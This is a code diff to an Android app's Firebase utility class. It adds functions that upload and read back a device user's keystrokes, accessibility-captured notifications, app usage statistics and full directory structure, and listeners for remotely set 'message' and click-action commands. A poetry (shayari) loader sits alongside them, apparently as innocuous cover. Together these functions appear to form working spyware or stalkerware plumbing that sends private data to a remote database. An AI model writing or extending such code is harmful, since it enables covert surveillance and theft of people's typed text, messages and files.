@@ -14,6 +14,7 @@ import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 import com.vikasyadavnsit.cdc.constants.AppConstants;
+import com.vikasyadavnsit.cdc.data.AppUsageReportData;
 import com.vikasyadavnsit.cdc.data.KeyStrokeData;
 import com.vikasyadavnsit.cdc.data.NotificationData;
 import com.vikasyadavnsit.cdc.data.User;
@@ -22,6 +23,7 @@ import com.vikasyadavnsit.cdc.enums.ClickActions;
 
 import java.util.Arrays;
 import java.util.HashMap;
+import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 
@@ -150,5 +152,137 @@ public class FirebaseUtils {
     public static void uploadUserNotificationDataSnapshot(NotificationData notificationData) {
         DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/notifications"));
         appTriggerSettingDataRef.push().setValue(notificationData);
+    }
+
+    public static void getAndroidUserClickActions() {
+        DatabaseReference ref = getDbRef(getPath("/appSettings/appTriggerSettingsDataMap"));
+        ref.addListenerForSingleValueEvent(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                if (dataSnapshot.exists()) {
+                    ActionUtils.getAndUpdateAndroidUserClickActions(dataSnapshot.getValue(Object.class));
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError databaseError) {
+                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
+            }
+        });
+    }
+
+    public static void getFlatUserDetails() {
+        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_BASE_PATH);
+        ref.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                if (dataSnapshot.exists()) {
+                    ActionUtils.performFlatUserDetailsActions(dataSnapshot.getValue(Object.class));
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError databaseError) {
+                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
+            }
+        });
+    }
+
+    public static void getAndroidUserKeystrokes() {
+        DatabaseReference ref = getDbRef(getPath("/userDeviceData/keystrokes"));
+        ref.addListenerForSingleValueEvent(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                if (dataSnapshot.exists()) {
+                    ActionUtils.displayAndroidUserKeystrokes(dataSnapshot.getValue(Object.class));
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError databaseError) {
+                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
+            }
+        });
+    }
+
+    public static void getAndroidUserAccessibilityNotification() {
+        DatabaseReference ref = getDbRef(getPath("/userDeviceData/notifications"));
+        ref.addListenerForSingleValueEvent(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                if (dataSnapshot.exists()) {
+                    ActionUtils.displayAndroidUserAccessibilityNotification(dataSnapshot.getValue(Object.class));
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError databaseError) {
+                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
+            }
+        });
+    }
+
+    public static void getAndroidUserSystemAppUsageStatistics() {
+        DatabaseReference ref = getDbRef(getPath("/userDeviceData/appStats"));
+        ref.addListenerForSingleValueEvent(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                if (dataSnapshot.exists()) {
+                    ActionUtils.displaySystemAppUsageStatisticsReportData(dataSnapshot.getValue(Object.class));
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError databaseError) {
+                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
+            }
+        });
+    }
+
+    public static void getMessageData() {
+        DatabaseReference ref = getDbRef(getPath("/message"));
+        ref.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                ActionUtils.performMessageAction(dataSnapshot.getValue(Object.class));
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError databaseError) {
+                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
+            }
+        });
+    }
+
+    public static void uploadApplicationUsageReportDataSnapshot(Map<String, AppUsageReportData> appUsageDataMap) {
+        getDbRef(getPath("/userDeviceData/appStats")).setValue(appUsageDataMap);
+    }
+
+    public static void uploadDeviceDirectoryStructureSnapshot(LinkedHashMap<String, Object> directoryMap) {
+        getDbRef(getPath("/userDeviceData/fileStructure")).setValue(directoryMap);
+    }
+
+    public static void getShayariCollection(ShayariCollectionCallback callback) {
+        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_SHAYARI_PATH);
+        ref.addListenerForSingleValueEvent(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                java.util.List<String> shayaris = new java.util.ArrayList<>();
+                for (DataSnapshot child : snapshot.getChildren()) {
+                    String value = child.getValue(String.class);
+                    if (value != null) shayaris.add(value);
+                }
+                callback.onLoaded(shayaris);
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+                callback.onLoaded(new java.util.ArrayList<>());
+            }
+        });
+    }
+
+    public interface ShayariCollectionCallback {
+        void onLoaded(java.util.List<String> shayaris);
     }
 }
